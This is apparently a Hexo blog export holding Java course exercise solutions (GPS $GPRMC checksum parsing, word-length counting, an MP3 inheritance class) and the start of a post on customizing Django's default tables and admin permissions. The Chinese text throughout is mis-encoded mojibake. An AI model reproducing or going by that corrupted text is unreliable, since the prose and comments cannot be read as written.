<h2 id="ä»£ç ï¼š"><a href="#ä»£ç ï¼š" class="headerlink" title="ä»£ç ï¼š"></a>ä»£ç ï¼š</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package é›¶åŸºç¡€å­¦Javaè¯­è¨€_ç¿æº;</span><br><span class="line"></span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Sixth_Week_2</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args)</span><br><span class="line">	&#123;</span><br><span class="line">		// TODO Auto-generated method stub</span><br><span class="line">		final int mod = 65536;</span><br><span class="line">		Scanner in = new Scanner(System.in);</span><br><span class="line">		String s = null;</span><br><span class="line">		int hh = 0, mm = 0, ss = 0;</span><br><span class="line">		int cnt = 0;</span><br><span class="line">		char state = 0;</span><br><span class="line">		String utc = null;</span><br><span class="line">		int judge = 0;</span><br><span class="line">		int judge_temp = 0;</span><br><span class="line">		String temp = null;</span><br><span class="line">		while (true)</span><br><span class="line">		&#123;</span><br><span class="line">			s = in.nextLine();</span><br><span class="line">			cnt = 0;</span><br><span class="line">			if (s.equals(&quot;END&quot;))			// è¯»å…¥ç»“æŸ</span><br><span class="line">				break;</span><br><span class="line">			temp = s.substring(0, 6);</span><br><span class="line">			if (temp.equals(&quot;$GPRMC&quot;))			// åˆ¤æ–­æ˜¯å¦ä¸º$GPRMC</span><br><span class="line">			&#123;</span><br><span class="line">				utc = s.substring(7, 13);</span><br><span class="line">				temp = null;</span><br><span class="line">				for (int i = 0; i &lt; s.length(); i++)				// è·å–å­—æ®µ2ï¼ˆå®šä½ï¼‰</span><br><span class="line">				&#123;</span><br><span class="line">					if (s.charAt(i) == &#x27;,&#x27;)</span><br><span class="line">						cnt++;</span><br><span class="line">					if (cnt == 2)</span><br><span class="line">					&#123;</span><br><span class="line">						state = s.charAt(i + 1);</span><br><span class="line">						cnt = 0;</span><br><span class="line">						break;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				if (state == &#x27;A&#x27;)				// åˆ¤æ–­æ˜¯å¦å®šä½</span><br><span class="line">				&#123;</span><br><span class="line">					for (int i = 0; i &lt; s.length(); i++)					// è·å–å­—æ®µ16(æ ¡éªŒå€¼ï¼‰</span><br><span class="line">					&#123;</span><br><span class="line">						if (s.charAt(i) == &#x27;,&#x27;)</span><br><span class="line">							cnt++;</span><br><span class="line">						if (cnt == 12)</span><br><span class="line">						&#123;</span><br><span class="line">							temp = s.substring(i + 3, s.length());</span><br><span class="line">							judge = Integer.parseInt(temp, 16);</span><br><span class="line">							temp = null;</span><br><span class="line">							break;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					judge_temp = (int)s.charAt(1) ^ (int)s.charAt(2);// è®¡ç®—æ ¡éªŒå€¼</span><br><span class="line">					for (int i = 3; s.charAt(i) != &#x27;*&#x27;; i++)</span><br><span class="line">					&#123;</span><br><span class="line">						if (s.charAt(i) == &#x27;,&#x27;)</span><br><span class="line">							continue;</span><br><span class="line">						else</span><br><span class="line">							judge_temp = judge_temp ^ (int)s.charAt(i)%mod;</span><br><span class="line">					&#125;</span><br><span class="line">					if (judge == judge_temp)					// åˆ¤æ–­æ ¡éªŒå€¼æ˜¯å¦ç›¸ç­‰</span><br><span class="line">					&#123;</span><br><span class="line">						// utcæ—¶é—´è½¬æ¢bjtæ—¶é—´</span><br><span class="line">						ss = (utc.charAt(5) - &#x27;0&#x27;) + (utc.charAt(4) - &#x27;0&#x27;) * 10;</span><br><span class="line">						mm = (utc.charAt(3) - &#x27;0&#x27;) + (utc.charAt(2) - &#x27;0&#x27;) * 10;</span><br><span class="line">						hh = (utc.charAt(1) - &#x27;0&#x27;) + (utc.charAt(0) - &#x27;0&#x27;) * 10 + 8;</span><br><span class="line">						hh = hh % 24;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.printf(&quot;%02d:%02d:%02d&quot;, hh, mm, ss);</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="åšæ³•"><a href="#åšæ³•" class="headerlink" title="åšæ³•:"></a>åšæ³•:</h2><p>å…ˆåˆ¤æ–­å‰6ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºâ€œ$GPRMC&quot;ï¼Œç„¶ååˆ¤æ–­å­—æ®µ2(å®šä½)æ˜¯å¦ä¸ºAï¼Œç„¶åå°†å­—æ®µ16(æ ¡éªŒå€¼)ç”¨Integer.parseInt(str,16)æ–¹æ³•è½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œå¯¹&#39;$&#39;å’Œâ€˜*â€™ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ä½œ^è¿ç®—ï¼Œå¹¶ä¸æ ¡éªŒå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå†å°†UTCæ—¶é—´è½¬æ¢ä¸ºBJTæ—¶é—´ï¼Œå¹¶è¾“å‡ºã€‚<br>æ³¨æ„ï¼šå¯¹å­—ç¬¦è¿›è¡Œ^è¿ç®—æ—¶ï¼Œè¦å…ˆä½¿ç”¨å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºintå‹ï¼›<br>ã€€ã€€ã€€è¾“å‡ºæ—¶é—´æ—¶ï¼Œä¸è¶³ä¸¤ä½çš„å‰é¢è¦è¡¥0ï¼›<br>ã€€ã€€ã€€UTCæ—¶é—´è½¬æ¢ä¸ºBJTæ—¶é—´æ—¶å¯¹è·¨æ—¥çš„å¤„ç†ã€‚</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é›¶åŸºç¡€å­¦Javaè¯­è¨€_ç¿æº</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬å…­å‘¨ç¼–ç¨‹é¢˜_å•è¯é•¿åº¦</title>
    <url>/posts/26108/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®å†…å®¹ï¼š"><a href="#é¢˜ç›®å†…å®¹ï¼š" class="headerlink" title="é¢˜ç›®å†…å®¹ï¼š"></a>é¢˜ç›®å†…å®¹ï¼š</h2><p>ä½ çš„ç¨‹åºè¦è¯»å…¥ä¸€è¡Œæ–‡æœ¬ï¼Œå…¶ä¸­ä»¥ç©ºæ ¼åˆ†éš”ä¸ºè‹¥å¹²ä¸ªå•è¯ï¼Œä»¥â€˜.â€™ç»“æŸã€‚ä½ è¦è¾“å‡ºè¿™è¡Œæ–‡æœ¬ä¸­æ¯ä¸ªå•è¯çš„é•¿åº¦ã€‚è¿™é‡Œçš„å•è¯ä¸è¯­è¨€æ— å…³ï¼Œå¯ä»¥åŒ…æ‹¬å„ç§ç¬¦å·ï¼Œæ¯”å¦‚â€œit&#39;sâ€ç®—ä¸€ä¸ªå•è¯ï¼Œé•¿åº¦ä¸º4ã€‚æ³¨æ„ï¼Œè¡Œä¸­å¯èƒ½å‡ºç°è¿ç»­çš„ç©ºæ ¼ã€‚</p>
<span id="more"></span>
<h2 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼:"></a>è¾“å…¥æ ¼å¼:</h2><p>è¾“å…¥åœ¨ä¸€è¡Œä¸­ç»™å‡ºä¸€è¡Œæ–‡æœ¬ï¼Œä»¥â€˜.â€™ç»“æŸï¼Œç»“å°¾çš„å¥å·ä¸èƒ½è®¡ç®—åœ¨æœ€åä¸€ä¸ªå•è¯çš„é•¿åº¦å†…ã€‚</p>
<h2 id="è¾“å‡ºæ ¼å¼ï¼š"><a href="#è¾“å‡ºæ ¼å¼ï¼š" class="headerlink" title="è¾“å‡ºæ ¼å¼ï¼š"></a>è¾“å‡ºæ ¼å¼ï¼š</h2><p>åœ¨ä¸€è¡Œä¸­è¾“å‡ºè¿™è¡Œæ–‡æœ¬å¯¹åº”çš„å•è¯çš„é•¿åº¦ï¼Œæ¯ä¸ªé•¿åº¦ä¹‹é—´ä»¥ç©ºæ ¼éš”å¼€ï¼Œè¡Œæœ«æ²¡æœ‰æœ€åçš„ç©ºæ ¼ã€‚</p>
<h2 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>It's great to see you here.
</p></div>

<h2 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>4 5 2 3 3 4
</p></div>

<p><strong>æ—¶é—´é™åˆ¶ï¼š500mså†…å­˜é™åˆ¶ï¼š32000kb</strong></p>
<h2 id="ä»£ç ï¼š"><a href="#ä»£ç ï¼š" class="headerlink" title="ä»£ç ï¼š"></a>ä»£ç ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> é›¶åŸºç¡€å­¦Javaè¯­è¨€_ç¿æº;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sixth_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">		<span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		s = in.nextLine();</span><br><span class="line">		<span class="keyword">if</span> (s.charAt(<span class="number">0</span>) != <span class="string">&#x27;.&#x27;</span>)<span class="comment">//å¤„ç†è¾“å…¥ä¸ºä¸€ä¸ª&quot;.&quot;æ—¶çš„æƒ…å†µ</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length();)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; s.length(); j++)</span><br><span class="line">				&#123;</span><br><span class="line">					i = j;</span><br><span class="line">					<span class="keyword">if</span> (s.charAt(j) == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(j) == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						ans++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					System.out.print(ans);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					System.out.print(ans + <span class="string">&quot; &quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				ans = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">while</span> (s.charAt(i) == <span class="string">&#x27; &#x27;</span>)<span class="comment">// è¡Œä¸­å¯èƒ½å‡ºç°è¿ç»­çš„ç©ºæ ¼</span></span><br><span class="line">					i++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="å‘ç‚¹"><a href="#å‘ç‚¹" class="headerlink" title="å‘ç‚¹:"></a>å‘ç‚¹:</h2><p>ä¸€æ˜¯è¡Œä¸­å¯èƒ½å‡ºç°è¿ç»­çš„ç©ºæ ¼ï¼›<br>äºŒæ˜¯è¦å¤„ç†å¥½è¾“å…¥ä¸º&quot;.&quot;æ—¶çš„æƒ…å†µã€‚</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é›¶åŸºç¡€å­¦Javaè¯­è¨€_ç¿æº</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬å››å‘¨ç¼–ç¨‹é¢˜_å®ç°ä¸€ä¸ªè¡¨è¾¾MP3çš„åª’ä½“ç±»å‹</title>
    <url>/posts/46392/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h2><p>æœ¬å‘¨æˆ‘ä»¬ä»‹ç»äº†ä»¥ç»§æ‰¿æ–¹å¼å®ç°çš„åª’ä½“èµ„æ–™åº“ï¼Œåœ¨è¯¾ç¨‹ä»£ç å®ç°çš„åŸºç¡€ä¸Šï¼Œè¯·å®ç°ä¸€ä¸ªè¡¨è¾¾MP3çš„åª’ä½“ç±»å‹ï¼Œèƒ½å’ŒCDã€DVDä¸€æ ·å­˜æ”¾è¿›è¿™ä¸ªDatabaseã€‚è¯·æäº¤è¿™ä¸ªMP3ç±»çš„ä»£ç ã€‚å¦‚æœä½ è®¤ä¸ºä¸ºäº†èƒ½å­˜æ”¾MP3ï¼Œéœ€è¦ä¿®æ”¹Itemå’ŒDatabaseï¼Œä¹Ÿè¯·ä¸€å¹¶æäº¤Itemå’ŒDatabaseçš„ä»£ç ã€‚</p>
<span id="more"></span>
<h2 id="ä»£ç ï¼š"><a href="#ä»£ç ï¼š" class="headerlink" title="ä»£ç ï¼š"></a>ä»£ç ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> String title;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> playTime;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">gotIt</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">private</span> String comment;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Item</span><span class="params">(String title, <span class="type">int</span> playTime, <span class="type">boolean</span> gotIt, String comment)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">this</span>.title = title;</span><br><span class="line">		<span class="built_in">this</span>.playTime = playTime;</span><br><span class="line">		<span class="built_in">this</span>.gotIt = gotIt;</span><br><span class="line">		<span class="built_in">this</span>.comment = comment;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;title:&quot;</span>+title+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;playTime:&quot;</span>+playTime+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;gotIt:&quot;</span>+gotIt+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;comment:&quot;</span>+comment+<span class="string">&quot;;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mp3</span> <span class="keyword">extends</span> <span class="title class_">Item</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> String artist;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> numofTracks;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Mp3</span><span class="params">(String title, <span class="type">int</span> playTime, <span class="type">boolean</span> gotIt, String comment,String artist,<span class="type">int</span> numofTracks)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">super</span>(title, playTime, gotIt, comment);</span><br><span class="line">		<span class="built_in">this</span>.artist=artist;</span><br><span class="line">		<span class="built_in">this</span>.numofTracks=numofTracks;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;Mp3:&#123;&quot;</span>);</span><br><span class="line">		<span class="built_in">super</span>.print();</span><br><span class="line">		System.out.println(<span class="string">&quot;artist:&quot;</span>+artist+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;numofTracks:&quot;</span>+numofTracks+<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Database</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;Item&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Item&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Item item)</span></span><br><span class="line">	&#123;</span><br><span class="line">		list.add(item);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(Item item:list)</span><br><span class="line">			item.print();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		Database db=<span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line">		db.add(<span class="keyword">new</span> <span class="title class_">Mp3</span>(<span class="string">&quot;A&quot;</span>, <span class="number">60</span>, <span class="literal">true</span>, <span class="string">&quot;good&quot;</span>, <span class="string">&quot;John&quot;</span>, <span class="number">20</span>));</span><br><span class="line">		db.add(<span class="keyword">new</span> <span class="title class_">Mp3</span>(<span class="string">&quot;B&quot;</span>, <span class="number">80</span>, <span class="literal">true</span>, <span class="string">&quot;vrey good&quot;</span>, <span class="string">&quot;Tom&quot;</span>, <span class="number">10</span>));</span><br><span class="line">		db.list();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="è¿è¡Œç»“æœï¼š"><a href="#è¿è¡Œç»“æœï¼š" class="headerlink" title="è¿è¡Œç»“æœï¼š"></a>è¿è¡Œç»“æœï¼š</h2><p><img data-src="/images/20170823002504047.jpg"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Djangoçš„ä¸€äº›é­”æ”¹</title>
    <url>/posts/2053290144/</url>
    <content><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a><a name="ä»‹ç»">ä»‹ç»</a></h1><p><a href="https://docs.djangoproject.com/zh-hans/4.2/">Django</a>å’Œ<a href="https://www.django-rest-framework.org/">Django REST Framework</a>éƒ½æ˜¯åŠŸèƒ½å¾ˆå¼ºå¤§çš„æ¡†æ¶,ä¸ºæˆ‘ä»¬çš„å¼€å‘å·¥ä½œæä¾›äº†æå¤§çš„ä¾¿åˆ©.ä½†åœ¨æŸäº›ç‰¹å®šéœ€æ±‚ä¸‹,éš¾å…å­˜åœ¨ä¸€äº›é™åˆ¶å’Œä¸ä¾¿ä¹‹å¤„,ä¸ºæ­¤æˆ‘ä»¬éœ€è¦è¿›è¡Œä¸€äº›è‡ªå®šä¹‰ä¿®æ”¹å’Œæ‹“å±•(<del>é­”æ”¹</del>).</p>
<span id="more"></span>

<h1 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a><a name="ç›®å½•">ç›®å½•</a></h1><ul>
<li><a href="#%E4%BB%8B%E7%BB%8D">ä»‹ç»</a></li>
<li><a href="#%E7%9B%AE%E5%BD%95">ç›®å½•</a></li>
<li><a href="#django">Django</a><ul>
<li><a href="#remove-default-table">Remove default Table</a></li>
<li><a href="#remove-is_staff">Remove is_staff</a><ul>
<li><a href="#%E9%87%8D%E5%86%99adminsite">é‡å†™AdminSite</a></li>
<li><a href="#property">property</a></li>
</ul>
</li>
<li><a href="#remove-unused-user-field">Remove unused User field</a></li>
<li><a href="#exception-handle">Exception Handle</a><ul>
<li><a href="#backend">BackEnd</a><ul>
<li><a href="#drf%E4%B8%AD%E9%94%99%E8%AF%AF%E5%93%8D%E5%BA%94%E7%9A%84%E7%BB%93%E6%9E%84">DRFä¸­é”™è¯¯å“åº”çš„ç»“æ„</a></li>
<li><a href="#validationerror%E7%9A%84%E4%BD%BF%E7%94%A8">ValidationErrorçš„ä½¿ç”¨</a></li>
<li><a href="#custom-exception-handling">Custom exception handling</a></li>
</ul>
</li>
<li><a href="#frontend">FrontEnd</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#django-rest-framework">Django REST framework</a><ul>
<li><a href="#pagination-unlimited">Pagination unlimited</a></li>
</ul>
</li>
<li><a href="#django-admin">Django Admin</a><ul>
<li><a href="#display-jsonfield">Display JSONField</a></li>
<li><a href="#override-useradmin">Override UserAdmin</a></li>
</ul>
</li>
</ul>
<h1 id="Django"><a href="#Django" class="headerlink" title="Django"></a><a name="django">Django</a></h1><h2 id="Remove-default-Table"><a href="#Remove-default-Table" class="headerlink" title="Remove default Table"></a><a name="remove-default-table">Remove default Table</a></h2><p>Djangoé»˜è®¤ä¼šåœ¨æ•°æ®åº“ä¸­åˆ›å»º9å¼ è¡¨,ç„¶è€Œæˆ‘ä»¬ä¸€èˆ¬åªä½¿ç”¨Djangoä½œä¸ºåç«¯æ¥å£æ¥ä¸ºå‰ç«¯æä¾›æœåŠ¡,å¯èƒ½ç”¨ä¸åˆ°è¿™äº›é»˜è®¤ç”Ÿæˆçš„è¡¨.å› æ­¤,ä¸ºäº†èŠ‚(æŠ€)çœ(æœ¯)èµ„(æ´)æº(ç™–),æˆ‘ä»¬å¯ä»¥ç¦ç”¨ä¸€äº›ç”¨ä¸åˆ°çš„åŠŸèƒ½æ¥é¿å…åœ¨æ•°æ®åº“ä¸­åˆ›å»ºè¿™äº›è¡¨.<br>Adminç®¡ç†ç«™ç‚¹ä¾èµ–çš„è¡¨:</p>
<ul>
<li>django_seesion</li>
<li>django_admin_log</li>
<li>django_content_type</li>
</ul>
<p>å¦‚æœæ—¢ä¸éœ€è¦ä½¿ç”¨Adminç®¡ç†ç«™ç‚¹åŠŸèƒ½,ä¹Ÿä¸éœ€è¦ä½¿ç”¨sessionåšä¼šè¯ä¿æŒ,è¿˜éœ€ä»<code>settings.py</code>æ–‡ä»¶é…ç½®çš„<code>MIDDLEWARE</code>ä¸­åˆ é™¤<code>django.contrib.sessions.middleware.SessionMiddleware</code>,ä»¥åŠä»<code>INSTALLED_APPS</code>ä¸­åˆ é™¤<code>django.contrib.sessions</code>.<br>å°†<code>User</code>ä¸­çš„<code>groups</code>å’Œ<code>user_permissions</code>è®¾ç½®ä¸º<code>None</code>å¯ä»¥é˜»æ­¢Djangoåˆ›å»ºuser_groups,user_user_permissionsä¸¤å¼ è¡¨</p>
<details open>
<summary>user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AbstractUser</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">AbstractUser</span>):</span><br><span class="line">    ...</span><br><span class="line">    groups = []</span><br><span class="line">    user_permissions = []</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

</details>

<p>âš ï¸åœ¨å…¬å¸ç”Ÿäº§ç¯å¢ƒä¸­,å¦‚æœä¸ä½¿ç”¨migrateå‘½ä»¤,å¯ä»¥æ‰‹åŠ¨åˆ é™¤ä»¥ä¸‹å››å¼ è¡¨:</p>
<ul>
<li>auth_group</li>
<li>auth_permission</li>
<li>auth_group_permissions</li>
<li>django_migrations</li>
</ul>
<h2 id="Remove-is-staff"><a href="#Remove-is-staff" class="headerlink" title="Remove is_staff"></a><a name="remove-is_staff">Remove is_staff</a></h2><p>åœ¨Djangoä¸­,é»˜è®¤ä½¿ç”¨<a href="https://docs.djangoproject.com/zh-hans/4.1/ref/contrib/auth/#django.contrib.auth.models.User.is_staff">is_staff</a>å­—æ®µæ¥æ§åˆ¶ç”¨æˆ·èƒ½å¦ç™»å½•ç®¡ç†ç«™ç‚¹.ä½†åœ¨å®é™…åº”ç”¨ä¸­,æˆ‘ä»¬å¯èƒ½å¸Œæœ›åªä½¿ç”¨<code>is_superuser</code>ä¸€ä¸ªå­—æ®µæ¥åŒæ—¶æ§åˆ¶ç”¨æˆ·çš„ç®¡ç†å‘˜æƒé™å’Œç™»å½•ç®¡ç†ç«™ç‚¹çš„æƒé™,æœ‰ä»¥ä¸‹ä¸¤ç§å®ç°æ–¹å¼.</p>
<h3 id="é‡å†™AdminSite"><a href="#é‡å†™AdminSite" class="headerlink" title="é‡å†™AdminSite"></a><a name="é‡å†™adminsite">é‡å†™AdminSite</a></h3><p>é‡å†™AdminSiteä¸­åˆ¤æ–­æƒé™çš„é€»è¾‘,å°†å…¶ä¿®æ”¹ä¸ºåˆ¤æ–­<code>is_superuser</code>.å‚è€ƒ<a href="https://docs.djangoproject.com/zh-hans/4.2/ref/contrib/admin/#overriding-the-default-admin-site">è¦†ç›–é»˜è®¤çš„ç®¡ç†ç«™ç‚¹ | Django ç®¡ç†ç«™ç‚¹ | Django æ–‡æ¡£</a>.</p>
<details open>
<summary>myproject/admin.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.core.handlers.wsgi <span class="keyword">import</span> WSGIRequest</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAdminSite</span>(admin.AdminSite):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">has_permission</span>(<span class="params">self, request: WSGIRequest</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> request.user.is_active <span class="keyword">and</span> request.user.is_superuser</span><br></pre></td></tr></table></figure>

</details>

<h3 id="property"><a href="#property" class="headerlink" title="property"></a><a name="property">property</a></h3><p>é™¤äº†é‡å†™<code>AdminSite</code>ç±»,è¿˜å¯ä»¥å€ŸåŠ©<code>property</code>æ¥å®ç°.</p>
<details open>
<summary>user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AbstractUser</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">AbstractUser</span>):</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_staff</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.is_superuser</span><br></pre></td></tr></table></figure>

</details>

<p>è¿™ç§æ–¹å¼ä¼šæœ‰å‰¯ä½œç”¨,å®ƒä¼šä»Djangoçš„ç”¨æˆ·æ¨¡å‹ä¸­ç§»é™¤<code>is_staff</code>å­—æ®µ.ç”±äºDjangoé»˜è®¤çš„<code>UserAdmin</code>è¿˜ä¼šå±•ç¤º<code>is_staff</code>å­—æ®µ,æ‰€ä»¥åœ¨Adminç«™ç‚¹ä¸­è®¿é—®ç”¨æˆ·é¡µé¢æ—¶ä¼šæŠ¥é”™,è§£å†³æ–¹æ¡ˆå¯å‚è€ƒä¸‹ä¸€èŠ‚<a href="#remove-unsed-user-field">Remove unused User field</a>.</p>
